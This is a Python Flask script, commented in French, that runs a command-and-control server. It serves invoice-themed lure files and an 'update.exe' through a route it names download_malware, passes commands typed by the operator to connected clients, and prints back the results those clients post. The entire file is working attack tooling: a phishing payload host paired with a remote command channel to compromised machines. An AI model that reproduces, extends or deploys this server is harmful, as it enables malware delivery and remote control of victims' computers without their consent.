import logging
import threading
import time
import os
from flask import Flask, request, send_from_directory

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)

command_to_send = "IDLE"

@app.route('/Facture.zip', methods=['GET'])
def download_zip():
    try:
        return send_from_directory(os.getcwd(), 'Facture.zip', as_attachment=True)
    except FileNotFoundError:
        return "File not found", 404

@app.route('/update.exe', methods=['GET'])
def download_malware():
    try:
        return send_from_directory(os.getcwd(), 'update.exe', as_attachment=True)
    except FileNotFoundError:
        return "File not found", 404

@app.route('/facture.pdf', methods=['GET'])
def download_pdf():
    try:
        return send_from_directory(os.getcwd(), 'Facture.pdf', as_attachment=True)
    except FileNotFoundError:
        return "File not found", 404
    
@app.route('/get_task', methods=['GET'])
def get_task():
    global command_to_send
    
    if command_to_send != "IDLE":
        task = command_to_send
        command_to_send = "IDLE" 
        return task
    
    return "" # Renvoie vide si rien à faire

@app.route('/post_result', methods=['POST'])
def post_result():
    result = request.data.decode('utf-8', errors='ignore')
    
    if result:
        print(f"\n{'-'*30}\n{result}\n{'-'*30}")
        print("C2 > ", end="", flush=True)
        
    return "OK"

def console_input():
    global command_to_send
    
    time.sleep(1)
    
    print("\n[*] Serveur C2 Démarré. En attente de connexion...")
    print("[*] Tapez vos commandes ci-dessous (ex: whoami, ipconfig, dir)\n")

    while True:
        user_input = input("C2 > ")
        
        if user_input.strip() != "":
            command_to_send = user_input

def run_server():
    app.run(host='0.0.0.0', port=8000)

if __name__ == '__main__':
    if not os.path.exists("update.exe"):
        print("[!] ATTENTION : 'update.exe' est introuvable dans ce dossier !")
    if not os.path.exists("Facture.pdf"):
        print("[!] ATTENTION : 'Facture.pdf' est introuvable dans ce dossier !")
    t = threading.Thread(target=console_input)
    t.daemon = True # Le thread mourra quand on fermera le script
    t.start()
    
    run_server()